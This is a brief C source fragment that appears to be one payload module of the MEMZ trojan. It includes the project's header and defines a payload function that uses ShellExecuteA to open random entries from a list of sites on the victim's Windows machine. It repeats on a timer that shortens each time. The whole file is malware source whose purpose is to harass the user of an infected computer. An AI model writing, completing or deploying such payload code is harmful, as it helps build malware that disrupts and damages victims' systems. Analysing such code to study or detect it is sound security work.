#include "../MEMZ.h"

PAYLOADFUNCTIONDEFAULT(payloadExecute) {
	PAYLOADHEAD

	ShellExecuteA(NULL, "open", (LPCSTR)Sites[random() % SitesLen], NULL, NULL, SW_SHOWDEFAULT);

	out: return 600.0 / (times / 6.0 + 1) + 100 + (random() % 200);
}
